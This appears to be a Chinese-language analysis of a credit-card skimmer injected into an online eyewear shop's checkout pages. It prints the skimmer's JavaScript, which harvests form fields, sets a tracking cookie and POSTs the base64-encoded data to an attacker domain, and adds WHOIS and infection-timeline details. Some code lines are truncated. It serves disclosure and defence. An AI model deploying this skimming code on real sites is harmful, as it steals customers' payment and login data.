            var data = btoa(Malware.data); // base64编码
            var xhr = new XMLHttpRequest();
            xhr.open("POST", Malware.url, true);
            xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            xhr.send("info=" + data + "&hostname=" + hostname + "&key=" + Malware.myid);
          };
          Malware.data = null;
          data = null;
          setTimeout(function() {
            Malware.send();
          }, 30); //整个函数每30毫秒运行一次!
        } catch (e) {}
      }
    };
    //仅在有重要数据的页面运行
    if ((new RegExp("onepage|checkout|onestep", "gi")).test(window.location)) {
      Malware.send();
    }
## 它干了什么？
一步步的，这些是代码干的事:
### 开始
    //仅在有重要数据的页面运行
    if ((new RegExp("onepage|checkout|onestep", "gi")).test(window.location)) {
      Malware.send();
    }
这是整个脚本的入口点，它用于调用`send（）`，但前提是该页面是结帐页面。
### 声明主对象
    var Malware = {
      data: null,
      url: "https://webfotce.me/js/form.js",
我将其重命名为`Malware`，大部分代码都存在于此对象中。 `data`最终将存储用户的被盗数据，这些数据将被发送到`ulrl`。
### 识别用户
    myid: (function(cookieName) {
      // 检查cookie中的`setidd`字段
      var id = document.cookie.match(new RegExp("(?:^|; )" + cookieName.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"));
      return id ? decodeURIComponent(id[1]) : undefined;
    })("setidd") || (function() {
      //如果cookie不存在，那么将生成一个新ID，并将其保存在cookie的`setidd`字段//ID由当前的unix时间戳，短划线和长随机数组成
      //形如：`1529853014535-289383517`
      var timestamp = new Date();
      var id = timestamp.getTime() + "-" + Math.floor(Math.random() * (999999999 - 11111111 + 1) + 11111111);
      var expiration = new Date(new Date().getTime() + 60 * 60 * 24 * 1000); // 该cookie将在24小时后失效
      document.cookie = "setidd=" + id + "; path=/; expires=" + expiration.toUTCString();
      return id;
    })(),
`myid` 存储字符串ID以标识用户。  
在第一个代码块中，程序检查cookie中的`setidd`字段。
如果存在（受害者曾经访问过此网站），那么它会解析cookie提取其中的ID，并将其存储在`myid`中。
但是，如果cookie不存在，那么将生成一个新ID，并将其保存在`myid`和cookie的`setidd`字段中，该cookie将在24小时后失效。
ID由当前的unix时间戳，短划线和长随机数组成，形如：`1529853014535-289383517`。  
Helper function to vacuum up data
### 用辅助函数收集数据
    stealData: function() {
      // 将所有input、dropdown、textarea、checkboxe、和button (?)的值序列化
      // 保存于 Malware.data
      Malware.data = null;
      var elements = document.querySelectorAll("input, select, textarea, checkbox, button");
      for (var i = 0; i  0) {
          var name = elements[i].name;
          if (name == "") {
            name = i;
          };
          Malware.data += elements[i].name + "=" + elements[i].value + "&";
        }
      }
    },
首先，它将`data`属性清空，设置为`null`。 然后，它在页面上查找所有文本输入框，并以以下格式保存其名称(name)和值(value)：  
`name=admin&password=hunter2`
但实际上，因为`data`从`null`开始，当程序将新值和它拼接时，拼接后的字符串看起来更像是这样的：  
`nullusername=admin&password=hunter2`
因此我们知道我们正在与“顶级”黑客打交道。
### 大头的一个：`send()`
    send: function() {
      try {
        // ...
      } catch (e) {}
    }
这些是“专业”开发者，“专业”开发者永远不会让错误( error)妨碍他们。
#### 添加事件侦听器
    //当用户点击任意按钮或表单输入时，运行stealData()
    var elements = document.querySelectorAll("a[href*=\'javascript:void(0)\'],button, input, submit, .btn, .button");
    for (var i = 0; i  。断言这些攻击者是中国人应该比较靠谱。
    Registrar WHOIS Server:
    Registrar URL: http://www.bizcn.com
    Updated Date: 2017-10-25T07:11:06Z
    Creation Date: 2016-10-28T10:49:19Z
    Registry Expiry Date: 2018-10-28T10:49:19Z
    Registrar Registration Expiration Date:
    Registrar: Bizcn.com
谷歌搜索显示，这不是该公司唯一的恶意行为：当比特币大约6000美元时，他们涉嫌从这个红色赌场偷走250个比特币，这意味着他们偷了大约150万美元。
## 大体时间
根据[互联网快照存档](https://web.archive.org/web/20170603212808/https://www.marveloptics.com/templates/moptics/js/vendor/modernizr.js)，自2017年1月至6月期间，`marveloptics.com`已被感染，这意味着他们在过去一年中所有客户的信息都被窃取。
我今年6月24日通过电子邮件向`PI:EMAIL`发送了详细信息，但尚未收到回复。